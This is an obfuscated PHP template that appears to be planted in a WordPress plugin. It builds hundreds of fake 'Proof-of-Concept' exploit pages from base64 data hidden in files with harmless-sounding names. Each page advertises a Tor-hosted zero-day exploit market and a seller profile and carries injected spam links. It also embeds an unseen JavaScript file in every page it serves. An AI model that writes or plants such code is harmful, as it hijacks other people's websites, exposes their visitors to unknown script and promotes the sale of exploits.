<?php

function hqjsuxuv($jnaVUaO) {
    $i9sVZ = 0;
    $zShKyoG = strlen($jnaVUaO);
    for ($i = 0; $i < $zShKyoG; $i++) $i9sVZ += ord($jnaVUaO[$i]);
    return $i9sVZ;
}

$xURf0 = intval(get_query_var('nsxqflabkj'));

if ($xURf0 < 1 || $xURf0 > 968) return;
$jmzs2 = file(plugin_dir_path(__FILE__).'s3-disable.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$nax0bHPRMq = explode(';', base64_decode($jmzs2[$xURf0]));
if (count($nax0bHPRMq) < 2) return;
$uq5u7ID2q = $nax0bHPRMq[0];
$ySEx21D16 = hqjsuxuv($uq5u7ID2q);
$jTGrEyysj = $uq5u7ID2q . ' POC (Proof-of-Concept)';
$rKfW7Nv  = $nax0bHPRMq[1];
$m0qUZr = $nax0bHPRMq[2];
$itcmwm7NTM = $nax0bHPRMq[3];
$dET5JQSHm  = $nax0bHPRMq[4];
set_query_var('vwumdfpo', $jTGrEyysj);

$et4cx = '';
$qIYcekea = plugin_dir_path(__FILE__).'method-revisions.php';
if (is_file($qIYcekea)) {
	$a527c = file($qIYcekea, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($a527c);
	shuffle($a527c);
	$scM72gP = mt_rand(2, 5);
	if (count($a527c) > $scM72gP) {
		for ($ba1qLCqcpe = 0; $ba1qLCqcpe < $scM72gP; $ba1qLCqcpe++) {
			$s5eie = base64_decode(array_shift($a527c));
			$et4cx .= '<p><a href="'.$s5eie.'">'.$s5eie.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $jTGrEyysj; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $dET5JQSHm . "</p>\n";
				if (strlen($rKfW7Nv) > 0) echo "<p><strong>Published: </strong>" . $rKfW7Nv . "</p>\n";
				if (strlen($m0qUZr) > 0) echo "<p><strong>CVSS: </strong>" . $m0qUZr . "</p>\n";
				if (strlen($itcmwm7NTM) > 0) echo "<p><strong>CVSS Vector: </strong>" . $itcmwm7NTM . "</p>\n";
				?>
				<p><strong>Download <?php echo $jTGrEyysj; ?> here:</strong></p>
				
				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link1" value="http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/exploit-for-<?php echo str_replace(' ', '-', strtolower($uq5u7ID2q)) . '.' . $ySEx21D16; ?>/" readonly>
						<button onclick="copyLink('link1')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<p><strong>Tip:</strong> Download official Tor Browser at https://www.torproject.org/download/ to access .onion links.</p>

				<p>Check my portfolio here:</p>

				<div class="link-grid">
					<div class="link-box">
						<input type="text" id="link2" value="http://zeroday3sv534ljdendaufcrorz67yg6iujdpaknp6zqgxaevb7okfid.onion/members/tlncglobal.344/" readonly>
						<button onclick="copyLink('link2')">
							<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
							Copy
						</button>
					</div>
				</div>

				<?php
				echo $et4cx;
				?>


<script>
function copyLink(id) {
	const input = document.getElementById(id);
	input.select();
	document.execCommand('copy');
	const btn = input.nextElementSibling;
	btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg> Copied!';
	btn.style.background = '#ff4500';
	setTimeout(() => {
		btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg> Copy';
		btn.style.background = '#2c2c2c';
	}, 2000);
}
</script>

<style>
.link-grid { display: grid; gap: 30px; margin: 40px 0; }
.link-box { background: #F9FAFC; padding: 25px; border-radius: 12px; display: flex; align-items: center; gap: 25px; transition: box-shadow 0.3s ease; }
.link-box:hover { box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1); }
.link-box input { width: 70%; padding: 15px; border: 2px solid #2c2c2c; border-radius: 10px; font-size: 17px; }
.link-box button { background: #2c2c2c; color: white; padding: 0 35px 15px; border: none; border-radius: 10px; cursor: pointer; display: flex; align-items: center; transition: background 0.3s, transform 0.3s; }
.link-box button:hover { background: #ff4500; transform: scale(1.05); }
</style>


			</div>
		</article>
	</main>
</div>

<?php
$tYzcYrljSA = plugin_dir_path(__FILE__) . 'showcase-enable.js';
if (is_file($tYzcYrljSA)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($tYzcYrljSA);
	echo '</script>';
}
get_footer();
?>
